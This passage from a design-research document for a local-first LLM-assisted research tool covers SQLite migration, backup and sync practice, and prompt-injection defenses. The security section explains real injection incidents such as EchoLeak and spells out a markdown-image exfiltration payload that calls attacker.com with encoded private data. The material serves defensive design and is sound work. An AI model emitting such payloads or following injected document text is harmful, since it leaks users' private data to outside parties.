  - Source: https://dl.acm.org/doi/10.1145/169059.169209 ; https://scalingsynthesis.com/r-the-cost-structure-of-sensemaking/
  - Beta.1 implication: This gives beta.1 its accounting model and its single most decision-relevant headline metric: the cost ledger. Cost side: minutes on catalog/digest/note/link upkeep + API dollars per ingested work and per compose run. Return side: retrieval successes (found the needed evidence via the graph rather than re-reading), gap analyses that changed the reading plan, provenance-backed prose produced. Memoria's core bet — that machine labor shifts the encodon cost from human to machine — becomes directly testable: human-minutes-per-work-fully-integrated (Memoria) vs the same figure in the null-workflow baseline, with API cost tracked alongside. If human cost doesn't drop or returns don't rise, the structured representation is not paying rent, which is exactly the mechanism by which structured PKM dies.
- **First-person N=1 credibility discipline: pre-registration of definitions and metrics is what separates evidence from anecdote**
  - Evidence: Inference synthesized from verified sources rather than a single citation: WWC standards require operational outcome definitions and stable baselines before intervention (verified from WWC full text); MILC requires determining 'what would constitute professional success' before the study (verified from MILC full text); autobiographical design's Record Keeping tenet and 'improvements driven by specific, documented incidents' hallmark (search summaries of Neustaedter & Sengers); the standing criticism of first-person methods is subjectivity (CHI 2024 autoethnography review, search summary). All four independently converge on: decide what you will count, and how, before you start.
  - Source: https://ies.ed.gov/ncee/wwc/docs/referenceresources/wwc_scd.pdf ; http://www.cs.umd.edu/~ben/papers/Shneiderman2006Strategies.pdf ; https://dl.acm.org/doi/10.1145/2317956.2318034 ; https://dl.acm.org/doi/10.1145/3613904.3642355
  - Beta.1 implication: Beta.1 needs a short written evaluation protocol committed to the repo BEFORE first genuine use, containing: operational definitions (what counts as a session, a lapse, an insight event, an abandonment, 'success' levels), the metric list with collection mechanism for each (automatic log vs snippet diary vs weekly review), the baseline plan, the phase/contrast plan, and the decision rules (what results would mean 'proceed to beta.2', 'redesign flow X', or 'the null workflow won'). Given Memoria's history of invented-never-validated thresholds, the protocol should mark each threshold as provisional and record when genuine-use data revises it — that revision log is itself a beta.1 deliverable.

### Operational best practice for local-first single-user data tools: SQLite migration discipline, backup/restore verification, multi-device sync failure modes, no-telemetry crash diagnostics, and data-exit guarantees, grounded in shipped-product behavior (Anki, Zotero, Obsidian, Joplin, Actual Budget, restic, Litestream)

Research across shipped local-first, single-user tools (Anki, Zotero, Obsidian, Joplin, Actual Budget) and backup tooling (restic, Litestream, SQLite's own docs) converges on a coherent operational playbook for beta.1. (1) Migrations: every surviving product uses numbered, transactional, forward-only migrations with the ledger stored in the database itself (Actual's __migrations__ table, SQLite user_version pattern), stamps the data with a version, and refuses gracefully on mismatch (Zotero) — Anki adds an explicit downgrade path. A migration runner is a beta.1 blocker because beta.1 is the first version whose data must survive later versions. (2) Backups: Anki's design is the model — automatic snapshots on close/sync/timer AND immediately before risky operations, tiered retention — and the restic/Litestream evidence shows backups must be verified by restore, not by process success: Litestream #1083 silently stopped replicating with healthy-looking metrics. Beta.1 needs a one-action verify-restore and a freshness check comparing backup content to live data. SQLite hot copies must use VACUUM INTO/backup API plus post-copy integrity_check, never file copy. (3) Sync: putting a live DB in Dropbox/Syncthing is categorically corrupting (Zotero KB, Syncthing #4242); only plain-text merges survive sync, and even Obsidian's markdown auto-merge has mangled content; Joplin shows sync+E2EE+account-state moving entire vaults into conflicts. Multi-device sync should be out of beta.1 scope, with the DB rebuildable-from-files and outside any synced tree; git-on-markdown is the documented fallback. (4) Diagnostics without telemetry: the shipped pattern is user-initiated — a copyable debug report (Obsidian), local rotating logs and debug flags (Joplin), and a safe mode disabling extensions (Anki's shift-start, mapping to disabling LLM engines) — with the hard-won lesson that logs must never contain vault text (Joplin's log-database.txt leak). (5) Exit: export and backup are distinct guarantees (Zotero: export is explicitly not backup; backup unit is the whole closed data directory) and the strongest exit guarantee is Obsidian's file-over-app — the working format is the exit format. Beta.1 should execute the keep-test literally (open the vault in stock Obsidian, the bibliography in a reference manager) and classify every data element as canonical-file or derived-rebuildable. A final meta-point: Anki/restic provide validated cadence numbers (30-min snapshots, 2-day-then-tiered retention, quarterly deep verification) that beta.1 can adopt instead of inventing thresholds — directly addressing Memoria's known problem of invented, never-validated numbers.

- **Schema migrations: numbered, transactional, forward-only migration scripts tracked inside the database itself, applied on open; the version stamp is the last statement before COMMIT; never edit a shipped migration, only add new ones**
  - Evidence: The consensus SQLite pattern uses PRAGMA user_version (or a migrations table): on open, read current version, run every higher-numbered script in order inside BEGIN...COMMIT, bumping the version last so a failed migration leaves the version unbumped and retryable. Explicit shipped-app rules: never edit a shipped migration, back up before any non-trivial migration, test migrations against a copy of real data. Actual Budget implements exactly this with a plain __migrations__ table of integer IDs matched against a migrations folder of .sql files in its repo.
  - Source: https://levlaz.org/sqlite-db-migrations-with-pragma-user_version/ ; https://gluer.org/blog/sqlites-user_version-pragma-for-schema-versioning/ ; https://www.sqliteforum.com/p/sqlite-versioning-and-migration-strategies ; https://actualbudget.org/docs/backup-restore/restore/ (fetched and verified: __migrations__ table procedure)
  - Beta.1 implication: Beta.1 must ship a formal migration runner from day one (numbered SQL scripts, transactional, ledger stored in the DB), even with one user. This is cheapest at v1 and retrofitting is expensive. Inference: since beta.1 is the first version whose data must survive later versions, the migration runner is a beta.1 blocker, not a post-beta nicety.
- **Automatic snapshot before any risky operation: Anki takes an immediate backup before one-way sync downloads, .colpkg imports, and database checks, in addition to periodic backups**
  - Evidence: Anki manual (fetched, verified): backups run periodically (default every 30 minutes) and are additionally triggered immediately by one-way sync downloads, collection-package imports, and database checks; retention thins backups older than 2 days into configurable daily/weekly/monthly tiers (default 30 kept); restore is a built-in UI flow (File > Switch Profile > Open Backup) with the warning that changes since the backup are lost. Automatic backups exclude media files.
  - Source: https://docs.ankiweb.net/backups.html (fetched); https://faqs.ankiweb.net/restoring-an-automatic-backup-recovering-from-data-loss.html
  - Beta.1 implication: Beta.1 should copy Anki's defaults wholesale: snapshot automatically before every migration, bulk machine-write run, and import; keep a small tiered retention (e.g., every-close + daily/weekly); make restore a first-class in-app action, not a manual file operation. For Memoria specifically, machine writes into the vault are the analogue of Anki's 'risky operations' — every engine run that mutates the vault should be preceded by a cheap snapshot (git commit of markdown + DB snapshot), which also serves the reversibility requirement.
- **Version-stamp the data and refuse gracefully on mismatch; provide a deliberate downgrade path if mixed versions are expected**
  - Evidence: Zotero stores a DB version and an older Zotero refuses to open a newer database with a clear KB-documented error ('This version of Zotero is older than the version last used with your database'); the documented fix is reinstalling the latest version. Anki goes further: it upgrades the collection schema on open for performance but offers File > 'Downgrade & Quit' to rewrite the collection back to the compatibility version (ver field, minimum v11) so older clients can open it; skipping the downgrade produces an error in the older client, not corruption. Actual shows 'This budget cannot be loaded with this version of the app' on migration-ledger mismatch.
  - Source: https://www.zotero.org/support/kb/newer_db_version ; https://changes.ankiweb.net/ and https://github.com/ankidroid/Anki-Android-Backend/issues/1 (schema v11 vs v16, desktop upgrade-then-downgrade behavior); https://actualbudget.org/docs/backup-restore/restore/
  - Beta.1 implication: Beta.1 minimum bar: stamp both the vault (a version marker file next to the markdown) and the DB, and on mismatch refuse with a message naming both versions and the recovery step — never attempt best-effort reads that can corrupt. Inference: a single researcher with reinstalls/multiple machines WILL hit version skew; Anki-style active downgrade is the gold standard but overkill for beta.1 — forward-only migrations + graceful refusal + documented recovery is the right scope.
- **Keep the on-disk format transparent enough that version-mismatch recovery is a documented self-service procedure, not vendor surgery**
  - Evidence: Actual Budget's official docs walk end users through fixing a 'cannot be loaded' error themselves: unzip the backup, open db.sqlite in SQLite Browser, diff the __migrations__ table against the repo's migrations folder, apply missing .sql files, insert their IDs, rezip, retry restore. This is only possible because the export IS the raw database plus a metadata.json, and the migration ledger is a plain table.
  - Source: https://actualbudget.org/docs/backup-restore/restore/ (fetched and verified, including the insert into __migrations__ values(...) procedure)
  - Beta.1 implication: Memoria's derived SQLite should stay inspectable with stock tools (no custom encoding of content), and the migration ledger should be a plain table — this converts future support disasters into a documented recovery page. Inference: for a single-user product with no support organization, 'the user can repair it with sqlite3 and a doc page' is the only support model that exists.
- **Backup verification has three tiers — structural check, full data read, and actual restore-plus-diff — and only the restore test proves anything**
  - Evidence: restic's own tooling and community: `restic check` verifies repo structure; `restic check --read-data` (or --read-data-subset for periodic sampling) reads and re-hashes all pack data; forum consensus ('Restore tests - best practices - lesson learned', 'Howto make sure that the backups are restorable') is that a repo can pass check and still fail you, so the practice is restoring known files to a scratch location and diffing against the originals, on a schedule, with failures alerting loudly — a silently failing check script is worse than none.
  - Source: https://restic.readthedocs.io/en/latest/045_working_with_repos.html ; https://forum.restic.net/t/restore-tests-best-practices-lesson-learned/7351 ; https://forum.restic.net/t/howto-make-sure-that-the-backups-are-restorable/3777
  - Beta.1 implication: Beta.1 must ship a one-action 'verify backup' operation: restore latest snapshot to a scratch directory, run PRAGMA integrity_check on the restored DB, count/diff markdown files against live, and report. Inference: because Memoria's evaluation window is exactly when trust is being established, a restore drill should be part of the beta.1 acceptance checklist (performed at least once by the researcher on a second location), not just a feature that exists.
- **Assume replication/backup pipelines fail silently — verify freshness against actual data change, not process success**
  - Evidence: Litestream issue #1083 (fetched, verified): a v0.5.6 optimization skipped WAL sync when SQLite reused WAL space, so replication silently stopped — no errors logged, metrics appeared healthy (non-zero but frozen), and test restores were missing 14+ minutes of data; detected only by comparing backup freshness to live writes. Fixed via PR #1087. This is the flagship SQLite backup tool failing in exactly the way its users trusted it not to.
  - Source: https://github.com/benbjohnson/litestream/issues/1083 (fetched)
  - Beta.1 implication: Beta.1's backup health indicator must compare a content-derived marker (e.g., latest event/commit ID present in the newest snapshot) against the live vault, and surface staleness in the UI. Inference: 'the backup job ran without error' must never be the displayed evidence; this aligns with Memoria's own epistemics — checks over trust.
- **Never file-copy or file-sync a live SQLite database; hot copies must go through the backup API or VACUUM INTO, and even VACUUM INTO output needs post-verification**
  - Evidence: sqlite.org's 'How To Corrupt An SQLite Database File' documents that copying/syncing a database while another process has it open, or separating it from its journal/WAL files, corrupts it. VACUUM INTO is documented as a transactionally-consistent snapshot of a live DB, but SQLite does not fsync the generated file, and an interrupted VACUUM INTO leaves a corrupt output — so the copy must be integrity-checked after creation.
  - Source: https://www.sqlite.org/howtocorrupt.html ; https://docs.sqlitecloud.io/docs/sqlite/lang_vacuum (VACUUM INTO semantics incl. no-fsync caveat); https://oldmoe.blog/2024/04/30/backup-strategies-for-sqlite-in-production/
  - Beta.1 implication: Beta.1's snapshot code path must use VACUUM INTO or the backup API followed by PRAGMA integrity_check on the copy — never cp on an open DB. Inference: Memoria has an asymmetry to exploit — the keep-test markdown files are safe to copy at any moment; only the DB needs careful copying, which argues for keeping everything canonical in files and the DB strictly derived.
- **Putting a live database inside a cloud-sync folder (Dropbox/Google Drive/OneDrive/Syncthing) is categorically forbidden by vendors who tried**
  - Evidence: Zotero's official KB: storing the data directory in a cloud storage folder 'is extremely likely to corrupt your database or break Zotero in unexpected ways' because sync tools don't honor file locks and write into the DB behind the app's back; the forums contain 'countless reports over many years' of resulting corruption, some unrecoverable. Syncthing's own tracker (issue #4242, open for years) confirms it takes no fcntl locks, and its forum documents perpetual sync-conflict copies on frequently-written SQLite files.
  - Source: https://www.zotero.org/support/kb/data_directory_in_cloud_storage_folder ; https://github.com/syncthing/syncthing/issues/4242 ; https://forum.syncthing.net/t/sync-conflict-with-1-specific-sqlite-file-constantly/20836
  - Beta.1 implication: Beta.1 must define the vault layout so the researcher's inevitable Dropbox/Syncthing habit cannot destroy data: put the SQLite DB outside the synced tree or in an explicitly ignored subdirectory, and make it 100% rebuildable from the markdown + catalog files so 'delete the DB and rebuild' is the documented recovery for any corruption. Inference: docs-only prohibition is insufficient (Zotero has the doc and still gets the corruption reports); layout must enforce it.
- **Plain-text files are the only sync-survivable format: Obsidian Sync three-way merges markdown but falls back to last-write-wins for everything else, and even markdown auto-merge has corrupted content**
  - Evidence: Obsidian Sync merges concurrent .md edits with Google's diff-match-patch three-way merge; all other file types are last-modified-wins (silent overwrite). Auto-merge itself has a documented bug history (content duplicated or swapped between linked files, forum bug 65654), and Obsidian 1.9.7 added an opt-in 'Create conflict file' mode (name.sync-conflict-YYYYMMDD-HHMMSS.md) precisely because silent merging was not always safe.
  - Source: https://forum.obsidian.md/t/robust-sync-conflict-resolution/93544 ; https://forum.obsidian.md/t/merging-changes-automatically-content-of-document-swapped-duplicated-with-another-linked-files/65654 ; https://forum.obsidian.md/t/bases-sync-support-smart-merging-of-changes-and-or-generate-conflict/103921
  - Beta.1 implication: Inference: anything Memoria stores outside markdown will be last-write-wins or corrupted under any sync the researcher adds later; therefore the canonical layer (notes, catalog records, provenance) belongs in mergeable text files. Also: even best-in-class auto-merge silently mangles content sometimes, so Memoria's provenance/reversibility layer (git history) is the actual safety net, and beta.1 should treat it as such.
- **Sync entangled with encryption and account state is a data-loss amplifier; shipped note apps have moved entire vaults into 'Conflicts' on mundane events**
  - Evidence: Joplin issue #12375: after a client update prompted re-entry of the E2EE password while the user's Joplin Cloud account happened to be disabled, all notes (1,570) were moved to the conflicts folder and tags/notebooks disappeared from view. Independent long-form review (ctrl.blog) documents Joplin sync reliability degrading beyond ~600 notes on non-filesystem targets, with frequent manual restarts; Joplin forums document recurring conflict storms after enabling E2EE.
  - Source: https://github.com/laurent22/joplin/issues/12375 ; https://www.ctrl.blog/entry/joplin-notes-sync.html ; https://discourse.joplinapp.org/t/after-encryption-tons-of-conflicts/34483
  - Beta.1 implication: Inference: multi-device sync is out of scope for beta.1 — it is the single largest source of catastrophic data-loss modes in this product category, and Memoria's single-researcher constraint makes it deferrable. If the researcher needs two machines, the researched-safe fallback is git over the markdown vault (understood conflict model, full history), documented as the supported path, with the DB rebuilt per machine.
- **No-telemetry crash diagnostics = user-initiated local artifacts: a debug-info command, local logs, and a safe mode that disables extensions/engines**
  - Evidence: Obsidian (no automatic telemetry): 'Show debug info' command produces a copyable report, plus a sandbox vault for clean-environment repro and console access on request. Joplin: Help > Open Profile Directory + a flags.txt with --safe-mode --open-dev-tools --debug --log-level debug; support asks users to attach log.txt. Anki: no automatic crash reporting; errors surface in a dialog the user pastes into the forum, and the first diagnostic step is holding Shift at startup to disable all add-ons (isolating third-party code).
  - Source: https://help.obsidian.md/resources ; https://joplinapp.org/debugging/ ; https://faqs.ankiweb.net/when-problems-occur.html
  - Beta.1 implication: Beta.1 needs three cheap features: (1) a local rotating log of app + engine operations, (2) a one-command 'copy debug report' (app version, schema version, platform, config shape, recent errors — never vault content), (3) a safe mode that starts with all LLM engines disabled, mirroring Anki's shift-start, to isolate 'is it the engines or the core'. Inference: since the researcher is also the developer in beta.1, these serve self-diagnosis first, but they are also the mechanism by which effectiveness-evaluation evidence (what failed, when) gets captured without telemetry.
- **Local diagnostic logs leak user content unless redaction is designed in, and grow unbounded unless rotated**
  - Evidence: Joplin forum thread 'Log-database.txt contains notes': users found actual note text in the local database log, an acknowledged privacy hazard when sharing logs for support. Joplin also lacked log rotation for years (issue #5521, 'Implement rotating log files'), with users reporting multi-GB log disk usage.
  - Source: https://discourse.joplinapp.org/t/log-database-txt-contains-notes/9418 ; https://github.com/laurent22/joplin/issues/5521 ; https://discourse.joplinapp.org/t/joplin-logs-disk-space-usage/37450
  - Beta.1 implication: Beta.1 log discipline: never write vault text or LLM prompt/response payloads into diagnostic logs — log note IDs, operation types, token counts, hashes; cap and rotate log files. Inference: this matters doubly for Memoria because engine calls contain vault text, and the debug report will be pasted into public issue trackers or sent to the LLM vendor's support.
- **Export and backup are distinct guarantees and vendors say so explicitly: interchange export is lossy by design; the backup unit is the whole data directory with the app closed; sync is not backup**
  - Evidence: Zotero docs (fetched, verified): 'You shouldn't use export (e.g., to Zotero RDF, BibTeX, or RIS) as a backup method' — export resets Date Added/Modified and breaks word-processor citation links; the recommended backup is copying the entire data directory (zotero.sqlite + storage + subfolders) with Zotero closed, and syncing 'is not a complete substitute for a proper backup: the Zotero servers only store the most recent version'. Anki mirrors this: automatic backups exclude media; the full-fidelity unit is a .colpkg export with media included — and format evolution bit users: modern (zstd-compressed) .apkg/.colpkg files fail to import on older clients unless 'Support older Anki versions' was checked (AnkiDroid #14522, #17536).
  - Source: https://www.zotero.org/support/zotero_data (fetched) ; https://docs.ankiweb.net/exporting.html ; https://github.com/ankidroid/Anki-Android/issues/14522
  - Beta.1 implication: Beta.1 needs both guarantees separately: (a) backup = the whole vault directory, quiesced, restorable byte-for-byte; (b) interchange export (BibTeX/CSL-JSON for the catalog) documented as lossy and NOT a backup. Inference from the Anki zstd incident: when Memoria's own export format evolves, the default export should remain readable by the previous released version, or the export must carry its format version and the importer must say exactly which version can read it.
- **'File over app' is the exit guarantee that outperforms any export feature: the working format IS the exit format, directly usable by other tools**
  - Evidence: Obsidian CEO Steph Ango (kepano): 'if you want to create digital artifacts that last, they must be files you can control, in formats that are easy to retrieve and read'; explicitly 'a higher bar than portability. It's more than import/export, it means you can directly interact with the same exact files in other apps.' Obsidian ships this: the vault is plain markdown in a local folder; abandoning the app loses nothing. Contrast: Zotero's exit requires either lossy export or keeping the sqlite hostage; Anki's requires a versioned package format that has broken across versions.
  - Source: https://stephango.com/vault ; https://x.com/kepano/status/1675626836821409792 ; https://x.com/kepano/status/2050685329120834038
  - Beta.1 implication: Memoria's keep-test should be executed as an actual test in beta.1 acceptance: open the vault in stock Obsidian, confirm notes/pages/hubs are readable and navigable; open the bibliography in a reference manager; confirm nothing essential exists only in SQLite. Inference: every data class in beta.1 should be explicitly labeled 'canonical file' or 'derived/rebuildable', and anything that fails that classification is a design bug to fix before beta.1, because retrofitting file-over-app after users have data is what the failed exporters (Evernote-era) never managed.
- **Concrete cadence defaults from shipped practice: snapshot on close/sync/30-min timer with 2-day full retention thinning to daily/weekly/monthly; deep verification (--read-data-style) at least quarterly; restore drill on a different machine/path with a different file each time**
  - Evidence: Anki defaults: periodic backup every 30 minutes plus on close/sync, ~30 retained, thinning after 2 days into configurable daily/weekly/monthly tiers (manual, fetched). restic community floor: --read-data at least quarterly, --read-data-subset (e.g., 10% weekly) for cheap continuous coverage, restore tests to a different path/machine picking different files each time to avoid restoring the same byte pattern repeatedly.
  - Source: https://docs.ankiweb.net/backups.html (fetched) ; https://forum.restic.net/t/restore-tests-best-practices-lesson-learned/7351 ; https://servercrate.net/restic-verify-backups/
  - Beta.1 implication: Beta.1 can adopt these numbers directly instead of inventing thresholds (which prior Memoria docs are known to have done): snapshot on app close + before every engine batch/migration/import; retain ~30 with daily/weekly/monthly thinning; integrity-check every new DB snapshot immediately (cheap at single-user scale); one full restore drill during the beta.1 evaluation period. These are validated-by-shipping defaults, not invented ones — which matters given the abandonment risk from invented compliance burdens.

### Security posture for agent-enabled local tools at beta (2025-2026 state of practice): prompt-injection defenses shipped in real products, MCP security guidance, API-key handling in desktop apps, and responsible-disclosure/threat-model documentation for a beta where an LLM reads untrusted documents alongside the user's unpublished research

The 2025-2026 state of practice converged on one position, stated publicly by Anthropic, OpenAI, and Microsoft alike: prompt injection is unsolved and probably unsolvable by filtering — "The Attacker Moves Second" bypassed all 12 published detection defenses at >90% success, and even Anthropic's hardest-hardened browser agent still concedes ~1% attack success. Every credible shipped defense is therefore architectural: Willison's lethal trifecta and Meta's Rule of Two (never give one agent context untrusted input + private data + egress), quarantined/dual-LLM processing of untrusted documents with typed validated outputs (arXiv 2506.08837 patterns, DeepMind CaMeL), trust-labeled context segregation (Microsoft's post-EchoLeak fixes, Spotlighting), scoped writes and no auto-approved network access (Claude Code), and — most concretely for a markdown tool — blocking markdown image/link exfiltration, the one attack that succeeded against essentially every major product and that Obsidian's remote-image rendering leaves open today. For beta.1 this yields a short, cheap, high-leverage checklist: (1) per-engine Rule-of-Two allocation with the digest engine having zero egress beyond the LLM API; (2) a deterministic output linter stripping/flagging external URLs in machine-written notes; (3) trust/provenance labels carried through retrieval with untrusted spans demarcated in prompts; (4) API key in the OS keychain, never in the vault, invisible to engine contexts, verified absent from exports; (5) stdio-only least-privilege MCP surface; (6) a Claude-Code-style security page documenting scopes, egress, data-leaves-machine details, and honest residual risk, plus a one-maintainer SECURITY.md per OWASP/CISA norms; (7) 3-5 poisoned-document fixtures in the evaluation suite. Notably, the industry's direction — autonomy with containment, approval only for high-consequence actions, audit trails over consent dialogs — independently validates Memoria's core bet that safety comes from traceability, verification, and reversibility rather than per-item human approval; OWASP LLM01 guidance reserves human-in-the-loop for high-risk actions only. Evidence above is drawn from verified primary sources (vendor security docs, the official MCP spec, Willison's posts, CVE records); the beta.1 implications are my inference from that evidence applied to Memoria's requirements.

- **Treat the 'lethal trifecta' (access to private data + exposure to untrusted content + ability to communicate externally) as the core threat model; never let one agent context hold all three.**
  - Evidence: Simon Willison, June 16 2025: any agent combining the three lets an attacker who controls untrusted content steal private data; 'once an LLM agent has ingested untrusted input, it must be constrained so that it is impossible for that input to trigger any consequential actions.' He cites Microsoft 365 Copilot EchoLeak (CVE-2025-32711) as a real-world instance. This is now the standard framing cited by vendors and security firms.
  - Source: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
  - Beta.1 implication: Inference: Memoria structurally has all three legs — unpublished research (private data), ingested papers (untrusted content), and a paid LLM API plus rendered markdown (egress). Beta.1 cannot remove legs 1 and 2 (they ARE the product), so it must cut leg 3: engines that read extracted fulltext must have no network capability beyond the fixed LLM API endpoint, and everything an engine writes after touching untrusted text must be treated as tainted output, not as instructions.
- **Use Meta's 'Agents Rule of Two' as a per-agent design budget: each agent session satisfies at most two of {process untrusted input, access sensitive data/change state, communicate externally / change state externally}.**
  - Evidence: Meta published the Rule of Two on Oct 31 2025 as its practical agent-security framework, explicitly derived from Willison's trifecta; Willison endorsed it Nov 2 2025 as the best current guidance 'until genuine prompt injection defenses emerge.' Published critiques (Noma, Ken Huang) note it ignores oversight granularity — an all-three agent with human gates on consequential actions can be safer than a two-property agent in YOLO mode.
  - Source: https://ai.meta.com/blog/practical-ai-agent-security/ and https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/
  - Beta.1 implication: Inference: apply the budget per engine, not per product. E.g., the digest engine reads untrusted paper text + writes vault state but has zero external communication; a compose/gap-analysis engine reads the (already-digested, provenance-labeled) graph and can be given more latitude. Beta.1's engine inventory should state each engine's two-of-three allocation explicitly — this is a one-page table, not an architecture project.
- **Do NOT budget for injection-detection classifiers or guardrail products as a security control; adaptive attackers defeat them.**
  - Evidence: 'The Attacker Moves Second' (Oct 2025, joint OpenAI/Anthropic/DeepMind-affiliated authors) bypassed 12 published prompt-injection defenses with >90% attack success using adaptive attacks (RL, search, human red-teaming); 500-person human red-team hit 100% across all systems. Willison: vendor guardrails claiming '95% of attacks blocked' are 'a failing grade' in security terms.
  - Source: https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/ and https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
  - Beta.1 implication: Inference: any beta.1 line item like 'add an injection detector' is wasted security budget for a one-person project — it can be shipped later as UX (flagging suspicious spans for the researcher) but must never be the thing standing between a poisoned PDF and the vault. Spend the budget on deterministic constraints: egress control, output validation, provenance, reversibility — which is exactly Memoria's stated bet, now confirmed as the industry position.
- **Assume injection sometimes succeeds; even frontier vendors only reduce attack success rates and say so publicly.**
  - Evidence: Anthropic Claude for Chrome: safety work cut autonomous-mode attack success 23.6%→11.2%, browser-specific attacks 35.7%→0 on known techniques, ~1% on current internal adaptive evals — still called 'meaningful risk.' OpenAI on ChatGPT Atlas: prompt injection is 'unlikely to ever be fully solved,' shipped logged-out mode, narrow-scope prompting guidance, step-up confirmation for sensitive actions. Anthropic Claude Opus adversarial-training results ~1% ASR under best-of-N attack. All three labs publicly state the problem is unsolved.
  - Source: https://www.anthropic.com/news/claude-for-chrome, https://openai.com/index/hardening-atlas-against-prompt-injection/, https://openai.com/index/prompt-injections/
  - Beta.1 implication: Inference: beta.1's safety story should be worded the way vendors now word theirs: 'we assume a malicious document can steer an engine; consequences are bounded (no egress, scoped writes) and reversible (provenance + rollback).' Claiming prevention would be both false and out of step with every shipping product. This also means the beta.1 evaluation should include at least a handful of poisoned-document fixtures run through ingestion to observe (not necessarily block) what a steered engine does.
- **Kill markdown image/link exfiltration — the single most-exploited leak channel in LLM tools that render markdown. Every major product shipped a fix.**
  - Evidence: Willison's markdown-exfiltration tag documents successful variants against ChatGPT, Microsoft Copilot, GitHub Copilot Chat, Slack AI, Google Bard/NotebookLM, Amazon Q, and Claude.ai — 'every one of them has shipped a fix or mitigation': GitHub disabled markdown images to untrusted domains (camo proxy), OpenAI added the url_safe endpoint check, Anthropic uses a server-side image proxy. Attack: injected instructions make the model emit ![](https://attacker.com/?q=<base64-encoded-private-data>), which exfiltrates on render with zero clicks.
  - Source: https://simonwillison.net/tags/markdown-exfiltration/ and https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
  - Beta.1 implication: Inference — this is the highest-priority concrete control for Memoria: Obsidian's preview auto-fetches remote images, so a machine-written note containing an attacker-supplied image URL IS a working zero-click exfiltration channel for unpublished research. Beta.1 needs a verification check that machine-written markdown contains no external image embeds / suspicious encoded URLs (strip, rewrite to plain text, or flag). This is a deterministic linter on engine output — cheap, testable, and closes the one channel that has actually been exploited in the wild across the whole product category.
- **Label and segregate trust levels in retrieval: don't blend untrusted document text with trusted context in one undifferentiated prompt ('LLM scope violation').**
  - Evidence: EchoLeak (CVE-2025-32711, CVSS 9.3, June 2025) — first zero-click exploit against a production LLM system: a crafted external email in Microsoft 365 Copilot's RAG scope caused exfiltration of chat logs, OneDrive/SharePoint content with no user interaction. Microsoft's server-side fix: prompt-parsing hardening, context isolation to reduce automatic blending of external and internal content, DLP tags to exclude external content from processing.
  - Source: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711 and https://arxiv.org/html/2509.10540v1
  - Beta.1 implication: Inference: Memoria's compose flow is exactly a RAG over a mixed-trust corpus (raw extracted fulltext = untrusted; the researcher's own notes = trusted-ish; machine digests = intermediate). Beta.1 should carry a per-source trust/provenance label through retrieval and demarcate untrusted spans in prompts (Memoria's existing 'read barriers' concept maps directly onto what Microsoft shipped as context isolation). This is metadata plumbing, not new infrastructure.
- **Structurally demarcate untrusted content as data in prompts ('spotlighting') and process it in isolated context windows.**
  - Evidence: Microsoft shipped Spotlighting (delimiting/encoding untrusted input so the model can distinguish instructions from data) and Prompt Shields across Copilot. Claude Code documents 'Isolated context windows: web fetch uses a separate context window to avoid injecting potentially malicious prompts' as a shipped protection. Both are acknowledged as risk reduction, not elimination.
  - Source: https://code.claude.com/docs/en/security and EchoLeak mitigation coverage (https://socprime.com/blog/cve-2025-32711-zero-click-ai-vulnerability/)
  - Beta.1 implication: Inference: the digest engine should run untrusted fulltext in its own context whose output is a typed artifact (summary, anchored annotations, structured metadata) validated by deterministic code before entering the vault — never a free-form instruction stream to a more privileged engine. Prompt-level spotlighting (clear delimiters + 'this is document data, not instructions') is a near-zero-cost baseline that every serious vendor ships.
- **Use the published agent-security design patterns (quarantined/dual LLM, plan-then-execute, context minimization) rather than inventing controls.**
  - Evidence: 'Design Patterns for Securing LLM Agents against Prompt Injections' (Beurer-Kellner et al., arXiv 2506.08837, June 2025, authors from Google/IBM/ETH/Microsoft) codifies six patterns — Action-Selector, Plan-Then-Execute, LLM Map-Reduce, Dual LLM, Code-Then-Execute, Context Minimization — with the shared property that raw untrusted content never directly drives consequential tool calls. Dual-LLM/quarantine derives from Willison; DeepMind's CaMeL paper demonstrates 'defeating prompt injections by design.'
  - Source: https://arxiv.org/html/2506.08837v1 and https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
  - Beta.1 implication: Inference: Memoria's information flow maps cleanly onto Dual-LLM/Map-Reduce (quarantined digestion → typed outputs → deterministic graph writes), and the compose flow onto Plan-Then-Execute (plan derived from trusted graph, execution constrained). Beta.1's design doc should name which pattern each engine implements — it borrows a peer-reviewed vocabulary for free and makes the safety argument auditable.
- **The reference documented security posture for an agentic local tool: scoped writes, no auto-approved network commands, fail-closed permissions, honest residual-risk warning — see Claude Code's security page.**
  - Evidence: Verified from code.claude.com/docs/en/security: write access confined to the working directory ('clear security boundary'); network-fetching commands (curl/wget) never auto-approved; fail-closed permission matching; command-injection detection re-prompts even allowlisted commands; explicit user-responsibility statement; a Warning box stating 'no system is completely immune to all attacks'; untrusted-content best practices; HackerOne reporting channel with coordinated-disclosure expectations.
  - Source: https://code.claude.com/docs/en/security
  - Beta.1 implication: Inference: this page is the template for what beta.1 must ship as documentation: (1) what each engine may read/write (scope statement), (2) the egress policy (only the LLM API), (3) honest residual-risk warning, (4) untrusted-content guidance for the researcher, (5) how to report issues. For a single-maintainer beta this is roughly one day of writing, and it is what distinguishes 'a beta with a security posture' from 'a beta with security vibes.'
- **Follow the official MCP Security Best Practices for any MCP surface: stdio transport for local servers, explicit consent showing exact commands, sandboxing of spawned servers, scope minimization, no token passthrough, sessions never used for auth.**
  - Evidence: Verified from the official MCP security best practices document: local MCP servers 'SHOULD use the stdio transport to limit access to just the MCP client' and restrict any HTTP transport with an authorization token or IPC; clients MUST show the exact command before executing one-click server configs; token passthrough is 'explicitly forbidden'; progressive least-privilege scopes; secure random session IDs never used for authentication. NSA published a Cybersecurity Information Sheet on MCP (June 2026) and CSA published agentic MCP best practices — MCP hygiene is now baseline expectation, not exotica.
  - Source: https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices and https://media.defense.gov/2026/Jun/02/2003943289/-1/-1/0/CSI_MCP_SECURITY.PDF
  - Beta.1 implication: Inference: Memoria's MCP surface at beta.1 should be stdio-only (no localhost HTTP listener without a token — DNS-rebinding against local HTTP servers is a documented MCP attack), with per-engine least-privilege tool scopes rather than one omnibus toolset. If the runtime uses the Obsidian REST/HTTP MCP, the beta.1 checklist must verify it requires an auth token and binds to loopback. Third-party MCP servers are out of scope for beta.1: the official guidance is 'only use servers you trust,' and a research beta has no reason to bundle any.
